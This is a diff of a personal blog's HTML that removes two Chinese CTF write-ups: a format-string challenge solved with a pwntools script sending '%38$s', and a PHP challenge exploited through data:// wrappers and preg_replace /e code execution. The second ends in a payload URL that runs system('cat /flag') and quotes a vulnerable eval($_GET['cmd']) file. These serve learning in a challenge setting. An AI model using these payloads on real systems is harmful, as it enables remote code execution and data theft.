-    <link itemprop="mainEntityOfPage" href="https://li1x.github.io/CTF/Pwn/[HNCTF%202022%20Week1]fmtstrre/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/avatar.gif">
-      <meta itemprop="name" content="Li1x">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="Li1x's Blog">
-      <meta itemprop="description" content="">
-    </span>
-
-    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
-      <meta itemprop="name" content="undefined | Li1x's Blog">
-      <meta itemprop="description" content="">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          <a href="/CTF/Pwn/%5BHNCTF%202022%20Week1%5Dfmtstrre/" class="post-title-link" itemprop="url">BUU-[HNCTF 2022 Week1]fmtstrre的Wp</a>
-        </h2>
-
-        <div class="post-meta-container">
-          <div class="post-meta">
-    <span class="post-meta-item">
-      <span class="post-meta-item-icon">
-        <i class="far fa-calendar"></i>
-      </span>
-      <span class="post-meta-item-text">Posted on</span>
-
-      <time title="Created: 2024-02-05 01:44:31" itemprop="dateCreated datePublished" datetime="2024-02-05T01:44:31+08:00">2024-02-05</time>
-    </span>
-    <span class="post-meta-item">
-      <span class="post-meta-item-icon">
-        <i class="far fa-calendar-check"></i>
-      </span>
-      <span class="post-meta-item-text">Edited on</span>
-      <time title="Modified: 2024-03-11 00:28:33" itemprop="dateModified" datetime="2024-03-11T00:28:33+08:00">2024-03-11</time>
-    </span>
-    <span class="post-meta-item">
-      <span class="post-meta-item-icon">
-        <i class="far fa-folder"></i>
-      </span>
-      <span class="post-meta-item-text">In</span>
-        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-          <a href="/categories/pwn/" itemprop="url" rel="index"><span itemprop="name">pwn</span></a>
-        </span>
-    </span>
-
-  
-  
-  <span class="post-meta-item">
-    
-      <span class="post-meta-item-icon">
-        <i class="far fa-comment"></i>
-      </span>
-      <span class="post-meta-item-text">Disqus: </span>
-    
-    <a title="disqus" href="/CTF/Pwn/%5BHNCTF%202022%20Week1%5Dfmtstrre/#disqus_thread" itemprop="discussionUrl">
-      <span class="post-comments-count disqus-comment-count" data-disqus-identifier="CTF/Pwn/[HNCTF 2022 Week1]fmtstrre/" itemprop="commentCount"></span>
-    </a>
-  </span>
-  
-  
-    <span class="post-meta-break"></span>
-    <span class="post-meta-item" title="Word count in article">
-      <span class="post-meta-item-icon">
-        <i class="far fa-file-word"></i>
-      </span>
-      <span class="post-meta-item-text">Word count in article: </span>
-      <span>904</span>
-    </span>
-    <span class="post-meta-item" title="Reading time">
-      <span class="post-meta-item-icon">
-        <i class="far fa-clock"></i>
-      </span>
-      <span class="post-meta-item-text">Reading time &asymp;</span>
-      <span>2 mins.</span>
-    </span>
-</div>
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-          <p>先checksec一下</p>
-<p>![](CTF&#x2F;Pwn&#x2F;[HNCTF 2022 Week1]fmtstrre&#x2F;00.png)</p>
-<p>然后IDA(64)打开</p>
-<p>![](CTF&#x2F;Pwn&#x2F;[HNCTF 2022 Week1]fmtstrre&#x2F;01.png)</p>
-<blockquote>
-<p>open函数(成功打开文件返回非负整数，打开失败返回-1)</p>
-<p>read(fd, &amp;name, 48uLL)函数(向fd中读取48字节数据存放至name地址下)</p>
-<p>将name的地址赋值给v5</p>
-<p>再向buf中写入256字节数据</p>
-</blockquote>
-<p>格式化字符串漏洞点 <code>printf(buf)</code></p>
-<p>这段代码中需要打开flag这个文件 &#x3D;l&gt; 小技巧</p>
-<p>-&gt; 在当前目录下创建一个flag文件，并输入一些东西，可以帮助我们观察其在栈上的位置。</p>
-<p>-&gt;当然,这个文件不是必须的.</p>
-<p>该如何利用这个漏洞？根据这个题，flag这个文件的内容是存放在了栈中，那我们就要知道具体的位置。</p>
-<p>-&gt;偏移量的计算（看别人的Wp说是偏移了38）即flag 的内容是保存在第38个的位置上的</p>
-<p><strong>参考<a target="_blank" rel="noopener" href="https://www.cnblogs.com/falling-dusk/p/17858030.html">https://www.cnblogs.com/falling-dusk/p/17858030.html</a></strong></p>
-<p>![](CTF&#x2F;Pwn&#x2F;[HNCTF 2022 Week1]fmtstrre&#x2F;02.png)</p>
-<blockquote>
-<p>找 …4141… 类似的数据，看它是第几个地址（6）</p>
-</blockquote>
-<p>![](CTF&#x2F;Pwn&#x2F;[HNCTF 2022 Week1]fmtstrre&#x2F;03.png)</p>
-<blockquote>
-<p>name即flag的位置，0x20 &#x3D;32 &#x3D;&gt;偏移量.</p>
-<p>rsp到name的距离是 0x1d0 - 0x0d0 &#x3D; 256 &#x2F; 8 &#x3D;32</p>
-<p>​	对于这里要除以8 —&gt; 我理解的是（64位程序，栈中一个小格格是8字节数据，一共相差256字节，即32个小格子）</p>
-</blockquote>
-<p>32 + 6 &#x3D;38</p>
-<p><strong>exp:</strong></p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">io = remote()</span><br><span class="line">payload = <span class="string">&quot;%38$s&quot;</span></span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
-
-
-      
-    </div>
-
-    
-    
-    
-
-    <footer class="post-footer">
-        <div class="post-eof"></div>
-      
-    </footer>
-  </article>
-</div>
-
-
-
-
-    
-
-
-<div class="post-block">
-  
-  
-
-  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
-    <link itemprop="mainEntityOfPage" href="https://li1x.github.io/CTF/Web/BUU-ZJCTF,%E4%B8%8D%E8%BF%87%E5%A6%82%E6%AD%A4/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/avatar.gif">
-      <meta itemprop="name" content="Li1x">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="Li1x's Blog">
-      <meta itemprop="description" content="">
-    </span>
-
-    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
-      <meta itemprop="name" content="undefined | Li1x's Blog">
-      <meta itemprop="description" content="">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          <a href="/CTF/Web/BUU-ZJCTF,%E4%B8%8D%E8%BF%87%E5%A6%82%E6%AD%A4/" class="post-title-link" itemprop="url">BUU-ZJCTF,不过如此 - Wp</a>
-        </h2>
-
-        <div class="post-meta-container">
-          <div class="post-meta">
-    <span class="post-meta-item">
-      <span class="post-meta-item-icon">
-        <i class="far fa-calendar"></i>
-      </span>
-      <span class="post-meta-item-text">Posted on</span>
-
-      <time title="Created: 2024-01-30 06:23:42" itemprop="dateCreated datePublished" datetime="2024-01-30T06:23:42+08:00">2024-01-30</time>
-    </span>
-    <span class="post-meta-item">
-      <span class="post-meta-item-icon">
-        <i class="far fa-calendar-check"></i>
-      </span>
-      <span class="post-meta-item-text">Edited on</span>
-      <time title="Modified: 2024-03-26 01:42:39" itemprop="dateModified" datetime="2024-03-26T01:42:39+08:00">2024-03-26</time>
-    </span>
-    <span class="post-meta-item">
-      <span class="post-meta-item-icon">
-        <i class="far fa-folder"></i>
-      </span>
-      <span class="post-meta-item-text">In</span>
-        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-          <a href="/categories/Web/" itemprop="url" rel="index"><span itemprop="name">Web</span></a>
-        </span>
-    </span>
-
-  
-  
-  <span class="post-meta-item">
-    
-      <span class="post-meta-item-icon">
-        <i class="far fa-comment"></i>
-      </span>
-      <span class="post-meta-item-text">Disqus: </span>
-    
-    <a title="disqus" href="/CTF/Web/BUU-ZJCTF,%E4%B8%8D%E8%BF%87%E5%A6%82%E6%AD%A4/#disqus_thread" itemprop="discussionUrl">
-      <span class="post-comments-count disqus-comment-count" data-disqus-identifier="CTF/Web/BUU-ZJCTF,不过如此/" itemprop="commentCount"></span>
-    </a>
-  </span>
-  
-  
-    <span class="post-meta-break"></span>
-    <span class="post-meta-item" title="Word count in article">
-      <span class="post-meta-item-icon">
-        <i class="far fa-file-word"></i>
-      </span>
-      <span class="post-meta-item-text">Word count in article: </span>
-      <span>2k</span>
-    </span>
-    <span class="post-meta-item" title="Reading time">
-      <span class="post-meta-item-icon">
-        <i class="far fa-clock"></i>
-      </span>
-      <span class="post-meta-item-text">Reading time &asymp;</span>
-      <span>4 mins.</span>
-    </span>
-</div>
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-          <p><img src="/CTF/Web/BUU-ZJCTF,%E4%B8%8D%E8%BF%87%E5%A6%82%E6%AD%A4/00.png" alt="00"></p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">file_get_contents($text,&#x27;r&#x27;)===&quot;I have a dream&quot;</span><br></pre></td></tr></table></figure>
-
-<blockquote>
-<p>1.使用php:&#x2F;&#x2F;input</p>
-<p><strong>php:&#x2F;&#x2F;input</strong>可以访问请求的原始数据的只读流，将post请求的数据当作php代码执行。<strong>当传入的参数作为文件名打开时，可以将参数设为php:&#x2F;&#x2F;input,同时post想设置的文件内容，php执行时会将post内容当作文件内容。从而导致任意代码执行。</strong></p>
-<p><strong>遇到file_get_contents()要想到用php:&#x2F;&#x2F;input绕过。</strong></p>
-</blockquote>
-<p><img src="/CTF/Web/BUU-ZJCTF,%E4%B8%8D%E8%BF%87%E5%A6%82%E6%AD%A4/01.png" alt="01"></p>
-<blockquote>
-<p>2.使用data协议</p>
-<p>数据流封装器，以传递相应格式的数据。可以让用户来控制输入流，<strong>当它与包含函数结合时，用户输入的data:&#x2F;&#x2F;流会被当作php文件执行</strong></p>
-</blockquote>
-<p><img src="/CTF/Web/BUU-ZJCTF,%E4%B8%8D%E8%BF%87%E5%A6%82%E6%AD%A4/02.png" alt="02"></p>
-<p>next.php的内容</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$id</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;id&#x27;</span>];</span><br><span class="line"><span class="variable">$_SESSION</span>[<span class="string">&#x27;id&#x27;</span>] = <span class="variable">$id</span>;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">complex</span>(<span class="params"><span class="variable">$re</span>, <span class="variable">$str</span></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_ invoke__">preg_replace</span>(</span><br><span class="line">        <span class="string">&#x27;/(&#x27;</span> . <span class="variable">$re</span> . <span class="string">&#x27;)/ei&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;strtolower(&quot;\\1&quot;)&#x27;</span>,</span><br><span class="line">        <span class="variable">$str</span></span><br><span class="line">    );</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">foreach</span>(<span class="variable">$_GET</span> <span class="keyword">as</span> <span class="variable">$re</span> =&gt; <span class="variable">$str</span>) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="title function_ invoke__">complex</span>(<span class="variable">$re</span>, <span class="variable">$str</span>). <span class="string">&quot;\n&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getFlag</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">	@<span class="keyword">eval</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;cmd&#x27;</span>]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-
-
-
-
-<p><strong>1.preg_replace()的&#x2F;e模式存在命令执行漏洞		&#x2F;e -&gt; 可执行模式，此为PHP专有参数，例如preg_replace函数.</strong></p>
-<p><strong>知识学习</strong>（低版本php存在，新版本的php已经启用&#x2F;e）</p>
-<p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/2557">https://xz.aliyun.com/t/2557</a></p>
-<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_20408491/article/details/75095055">https://blog.csdn.net/qq_20408491/article/details/75095055</a></p>
-<blockquote>
-<p> <strong>preg_replace</strong> 函数在匹配到符号正则的字符串时，会将替换字符串（也就是上图 <strong>preg_replace</strong> 函数的第二个参数）当做代码来执行，然而这里的第二个参数却固定为 <strong>‘strtolower(“\1”)’</strong> 字符串，那这样要如何执行代码呢？</p>
-<p><strong>replacement</strong>可以包含\n形式或$n形式的逆向引用，n可以为0到99，\n表示匹配pattern第n个子模式的文本，\0表示匹配整个pattern的文本</p>
-</blockquote>
-<p><strong><code>\1</code> 在正则表达式中有自己的含义，</strong></p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">反向引用</span><br><span class="line"></span><br><span class="line">对一个正则表达式模式或部分模式 两边添加圆括号 将导致相关 匹配存储到一个临时缓冲区 中，所捕获的每个子匹配都按照在正则表达式模式中从左到右出现的顺序存储。缓冲区编号从 1 开始，最多可存储 99 个捕获的子表达式。每个缓冲区都可以使用 &#x27;\n&#x27; 访问，其中 n 为一个标识特定缓冲区的一位或两位十进制数</span><br><span class="line"></span><br><span class="line">这里的 \1 实际上是匹配第一个子匹配项,我们拿 ripstech 官方给的 payload 进行分析，方便大家理解。官方 payload 为： /?.*=&#123;$&#123;phpinfo()&#125;&#125; ，即 GET 方式传入的参数名为 /?.* ，值为 &#123;$&#123;phpinfo()&#125;&#125;</span><br></pre></td></tr></table></figure>
-
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">原先的语句： preg_replace(&#x27;/(&#x27; . $re . &#x27;)/ei&#x27;, &#x27;strtolower(&quot;\\1&quot;)&#x27;, $str);</span><br><span class="line">变成了语句： preg_replace(&#x27;/(.*)/ei&#x27;, &#x27;strtolower(&quot;\\1&quot;)&#x27;, &#123;$&#123;phpinfo()&#125;&#125;);</span><br></pre></td></tr></table></figure>
-
-<p><strong>2.此处由GET方法传入值，而GET方法传参时 -&gt; 当首字母为点号时，会被替换为下划线.</strong></p>
-<blockquote>
-<p><strong>\S*&#x3D;${phpinfo()}</strong></p>
-<p>\S 匹配任何非空白字符</p>
-</blockquote>
-<p><strong>3.PHP可变变量</strong></p>
-<p><code>payload \S\*=$&#123;phpinfo()&#125;</code></p>
-<blockquote>
-<p>在PHP中双引号包裹的字符串中可以解析变量，而单引号则不行。 <strong>${phpinfo()}</strong> 中的 <strong>phpinfo()</strong> 会被当做变量先执行，执行后，即变成 <strong>${1}</strong> (phpinfo()成功执行返回true)</p>
-</blockquote>
-<p>payload: <code>/?text=data://text/pain,I have a dream&amp;file=next.php&amp;\S*=$&#123;getFlag()&#125;&amp;cmd=system(&#39;cat /flag&#39;);</code></p>
-
+          
       
     </div>
 
@@ -1769,13 +1911,13 @@
     <span class="post-meta-item-icon">
       <i class="fa fa-chart-line"></i>
     </span>
-    <span title="Word count total">28k</span>
+    <span title="Word count total">40k</span>
   </span>
   <span class="post-meta-item">
     <span class="post-meta-item-icon">
       <i class="fa fa-coffee"></i>
     </span>
-    <span title="Reading time total">52 mins.</span>
+    <span title="Reading time total">1:13</span>
   </span>
 </div>
 <div class="busuanzi-count">
